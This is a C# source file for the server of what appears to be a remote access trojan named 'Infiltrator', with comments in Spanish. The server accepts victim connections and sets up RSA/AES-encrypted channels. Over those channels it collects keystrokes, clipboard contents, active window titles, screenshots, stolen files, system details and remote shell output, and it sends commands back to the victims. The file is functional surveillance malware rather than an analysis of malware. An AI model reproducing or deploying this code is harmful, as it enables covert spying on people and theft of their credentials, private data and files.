using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using Server.Log;
using Server.Crypto;


namespace Server.Conexion
{
    static class ServerSocket
    {

        private static TcpListener _listener;
        private static Dictionary<int, TcpClient> _clients = new Dictionary<int, TcpClient>();
        private static Dictionary<int, byte[]> _aesKeys = new Dictionary<int, byte[]>();
        private static int _clientIdCounter = 0;
        private static bool _isRunning;
        private static bool _waitingForResponse = false;
        private static Logger _logger = Logger.getInstance();
        public static BindingList<Cliente.Cliente> clientesConectados = new BindingList<Cliente.Cliente>();
        private static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048);

        private static string _publicKey = rsa.ToXmlString(false);
        private static string _privateKey = rsa.ToXmlString(true);

        public static bool serverStatus() => _isRunning;
        public static bool isWaiting() => _waitingForResponse;


 

        public static void stopServer()
        {
            _listener.Stop();
            _logger.Log("Deteniendo servidor Infiltrator...", LogLevel.INFO);
            _isRunning = false;
        }

        public static void SaveFile(string fileName, byte[] fileData)
        {
            try
            {
                File.WriteAllBytes(fileName, fileData);
                _logger.Log($"Archivo '{fileName}' recibido y guardado correctamente.", LogLevel.INFO);
            }
            catch (Exception ex)
            {
                _logger.Log($"Error al guardar el archivo '{fileName}': {ex.Message}", LogLevel.ERROR);
            }
        }

        public static bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client?.Client != null && client.Client.Connected)
                {
                    bool part1 = client.Client.Poll(1000, SelectMode.SelectRead);
                    bool part2 = (client.Client.Available == 0);
                    return !(part1 && part2);
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        public static void SendCommand(int clientId, string command, Channel ch)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(clientId, out TcpClient client))
                {
                    NetworkStream stream = client.GetStream();
                    if (_aesKeys.TryGetValue(clientId, out var aesKey) && ch != Channel.KeyExchange)
                    {
                        // Cifrar el comando con AES antes de enviarlo
                        byte[] plainBytes = Encoding.UTF8.GetBytes(command);
                        byte[] encryptedPayload = AesHelper.EncryptWithAes(plainBytes, aesKey); // Esta función la tienes que implementar igual que la de descifrado pero al revés
                        Protocol.Send(stream, ch, encryptedPayload);
                    }
                    else
                    {
                        // Enviar sin cifrar si no hay clave AES aún (solo para KeyExchange)
                        byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                        Protocol.Send(stream, ch, commandBytes);
                    }
                }
                else
                {
                    _logger.Log($"Cliente {clientId} no encontrado.", LogLevel.ERROR);
                }
            }
        }

        public static void AcceptClients()
        {
            try
            {
                while (_isRunning)
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    _clientIdCounter++;
                    int clientId = _clientIdCounter;

                    lock (_clients)
                    {
                        _clients.Add(clientId, client);
                    }

                    Protocol.Send(client.GetStream(), Channel.KeyExchange, Encoding.UTF8.GetBytes(_publicKey));

                    _logger.Log($"Cliente {clientId} conectado.", LogLevel.INFO);
                    Thread clientThread = new Thread(() => HandleClient(client, clientId));
                    clientThread.Start();
                }
            }
            catch (SocketException s)
            {
                // Se produce cuando listener.Stop() es llamado
                _logger.Log($"El servidor se ha detenido: {s.Message}", LogLevel.WARNING);
            }
        }


        public static void setWaiting(bool status) => _waitingForResponse = status;


        public static void startServer()
        {
            

            _listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
            _listener.Start();
            _logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}", LogLevel.INFO);

            // Al iniciar el cliente
            

            Thread acceptClientsThread = new Thread(AcceptClients);
            acceptClientsThread.Start();
            _isRunning = true;
        }

        public static void disconnectClient(int clientId) 
        {
            ServerSocket.SendCommand(clientId,"disconnect",Channel.Main);        
        }

        public static TcpClient getClientById(int clientId)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(clientId, out TcpClient client))
                {
                    return client;
                }
                else
                {
                    _logger.Log($"No se encontró TcpClient con ID {clientId}.", LogLevel.WARNING);
                    return null;
                }
            }
        }



        public static void HandleClient(TcpClient client, int clientId)
        {
            var stream = client.GetStream();
            var buffer = new byte[Config.BufferLength];

            try
            {
                while (true)
                {
                    // 1) leer el primer byte para ver si es un canal multiplexado
                    int b = stream.ReadByte();
                    if (b < 0) break;
                    var ch = (Channel)b;

                    if (Enum.IsDefined(typeof(Channel), ch))
                    {
                        // 2) multiplexado: 4 bytes de longitud + payload
                        ReadExact(stream, buffer, 0, 4);
                        int len = BitConverter.ToInt32(buffer, 0);
                        if (len <= 0 || len > 100_000_000) // aceptamos hasta 100 MB, ajustable
                            throw new Exception($"Longitud inválida: {len}");

                        byte[] payload = new byte[len];
                        ReadExact(stream, payload, 0, len);
                        // 3) despachar por canal
                        switch (ch)
                        {
                            case Channel.Keylogger:
                                {

                                    if (_aesKeys.TryGetValue(clientId, out var keyKeylogger))
                                    {
                                        string logText = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyKeylogger));
                                        var form = Keylogger.Instance;
                                        if (form.InvokeRequired)
                                            form.Invoke(new Action(() => form.AppendLog(logText)));
                                        else
                                            form.AppendLog(logText);
                                    }
                                    else
                                    {
                                        _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                    }
                                    break;
                                }

                            case Channel.ActiveWindow:
                                {
                                    if (_aesKeys.TryGetValue(clientId, out var keyActiveWindow))
                                    {
                                        string winText = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyActiveWindow));
                                        var form = Keylogger.Instance;
                                        if (form.InvokeRequired)
                                            form.Invoke(new Action(() => form.AppendActiveWindow(winText)));
                                        else
                                            form.AppendActiveWindow(winText);
                                    }
                                    else
                                    {
                                        _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                    }
                                    break;
                                }
                            case Channel.Clipboard:
                                {
                                    if (_aesKeys.TryGetValue(clientId, out var keyClipboard))
                                    {
                                        string clipText = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyClipboard));
                                        var form = Keylogger.Instance;
                                        if (form.InvokeRequired)
                                            form.Invoke(new Action(() => form.AppendClipboard(clipText)));
                                        else
                                            form.AppendClipboard(clipText);
                                    }
                                    else
                                    {
                                        _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                    }
                                    break;
                                }

                            case Channel.Screenshot:
                                if (_aesKeys.TryGetValue(clientId, out var keyScreenshot))
                                {
                                    byte[] decryptedImage = AesHelper.DecryptWithAes(payload, keyScreenshot);
                                    SaveScreenshot(decryptedImage,clientId,client);
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                }
                                break;


                            case Channel.File:
                                if (_aesKeys.TryGetValue(clientId, out var keyFile))
                                {
                                    // DESCIFRAR todo el payload primero
                                    byte[] decryptedPayload = AesHelper.DecryptWithAes(payload, keyFile);

                                    using (var ms = new MemoryStream(decryptedPayload))
                                    using (var reader = new BinaryReader(ms))
                                    {
                                        string fileName = "";
                                        // Leemos hasta encontrar el \n (nombre del archivo)
                                        while (ms.Position < ms.Length)
                                        {
                                            byte foo = reader.ReadByte();
                                            if (foo == (byte)'\n') break;
                                            fileName += (char)foo;
                                        }

                                        // El resto es el contenido real del archivo
                                        byte[] fileContent = reader.ReadBytes((int)(ms.Length - ms.Position));

                                        string clientDir = Path.Combine("downloads", $"client_{clientId}");
                                        Directory.CreateDirectory(clientDir);

                                        string fullPath = Path.Combine(clientDir, fileName);

                                        File.WriteAllBytes(fullPath, fileContent);
                                        _logger.Log($"Archivo guardado: {fullPath}", LogLevel.INFO);
                                    }
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                }
                                break;

                            case Channel.SystemInfo:
                                // Aquí se maneja el canal de archivos
                                Cliente.Cliente cliente = new Cliente.Cliente();

                                if (_aesKeys.TryGetValue(clientId, out var keySysInfo))
                                {
                                    string sysInfo = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keySysInfo));
                                    string[] lineas = sysInfo.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

                                    foreach (string linea in lineas)
                                    {
                                        if (linea.Contains("Nombre del equipo:"))
                                            cliente.Equipo = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Usuario:"))
                                            cliente.Usuario = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("IP:"))
                                            cliente.IP = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Sistema operativo:"))
                                            cliente.Sistema = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Versión de .NET:"))
                                            cliente.DotNet = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Número de procesadores:"))
                                            cliente.Procesadores = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Memoria RAM:"))
                                            cliente.RAM = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Procesador:"))
                                            cliente.CPU = linea.Split(':')[1].Trim();
                                        else if (linea.Contains("Tarjeta Gráfica:"))
                                            cliente.GPU = linea.Split(':')[1].Trim();
                                    }
                                    cliente.ID = _clientIdCounter;
                                    cliente.Port = ((IPEndPoint)client.Client.RemoteEndPoint).Port.ToString();

                                    MainForm.Instance.AgregarOActualizarCliente(cliente);
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);

                                }
                                break;

                            case Channel.CommandOutput:
                                if (_aesKeys.TryGetValue(clientId, out var keyCmd))
                                {
                                    string output = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyCmd));
                                    Shell.Instance.AppendCommandOutput(output);
                                    ServerSocket.setWaiting(false);
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                }
                                break;
                                break;

                            case Channel.FileManager:
                                if (_aesKeys.TryGetValue(clientId, out var keyFileMgr))
                                {
                                    string dirList = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyFileMgr));
                                    _logger.Log("Recibido listado para: " + dirList, LogLevel.INFO);
                                    FileTree.UpdateDirectoryTree(dirList, clientId);
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                }
                                break;

                            case Channel.KeyExchange:
                                
                                byte[] encryptedAesKey = payload;
                                byte[] aesKey;

                                lock (rsa)
                                {
                                    aesKey = rsa.Decrypt(encryptedAesKey, false);

                                }

                                _aesKeys[clientId] = aesKey;
                                _logger.Log($"Clave AES recibida y descifrada para el cliente {clientId}.", LogLevel.INFO);
                                break;
                            case Channel.Main:

                                // Si esperas datos cifrados en Main, también los descifras igual
                                if (_aesKeys.TryGetValue(clientId, out var keyMain))
                                {
                                    string command = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, keyMain));
                                    if (command.StartsWith("disconnect"))
                                    {
                                        _logger.Log($"Cliente {clientId} desconectado por comando.", LogLevel.INFO);
                                        disconnectClient(clientId);
                                        return;
                                    }
                                }
                                else
                                {
                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
                                }
                                break;

                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.Log($"Error cliente {clientId}: {ex.Message}", LogLevel.ERROR);
            }
            finally
            {
                client.Close();
                _clients.Remove(clientId);
                _logger.Log($"Cliente {clientId} desconectado", LogLevel.INFO);
            }
        }


        private static void ReadExact(NetworkStream stream, byte[] buffer, int offset, int count)
        {
            int total = 0;
            while (total < count)
            {
                int read = stream.Read(buffer, offset + total, count - total);
                if (read == 0)
                    throw new IOException("Conexión cerrada por el cliente.");
                total += read;
            }
        }

        public static void SaveScreenshot(byte[] imageData, int clientId, TcpClient cliente)
        {
            string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "screenshots");
            Directory.CreateDirectory(screenshotPath);

            string fileName = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
            string fullPath = Path.Combine(screenshotPath, fileName);

            try
            {
                File.WriteAllBytes(fullPath, imageData);
                _logger.Log($"Captura de pantalla guardada en: {fullPath}", LogLevel.INFO);

                // Mostrar SIEMPRE la ventana y la imagen usando BeginInvoke en el hilo principal
                Action showImage = () =>
                {
                    if (Screenshot.Instance == null || Screenshot.Instance.IsDisposed)
                    {
                        var screenshotForm = new Screenshot(clientId, cliente);
                        screenshotForm.Show();
                    }
                    Screenshot.Instance.DisplayScreenshotBytes(imageData);
                };

                // Invoca en el hilo principal de la UI
                if (Application.OpenForms.Count > 0)
                {
                    Form mainForm = Application.OpenForms[0];
                    if (mainForm.InvokeRequired)
                        mainForm.BeginInvoke(showImage);
                    else
                        showImage();
                }
                else
                {
                    // Si no hay formularios abiertos, ejecuta directamente (en consola, por ejemplo)
                    showImage();
                }

                MessageBox.Show("Captura de pantalla guardada: " + fullPath, "Captura de Pantalla", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                _logger.Log($"Error al guardar captura: {ex.Message}", LogLevel.ERROR);
                MessageBox.Show("Error al guardar o mostrar la captura: " + ex.Message);
            }
        }




    }
}
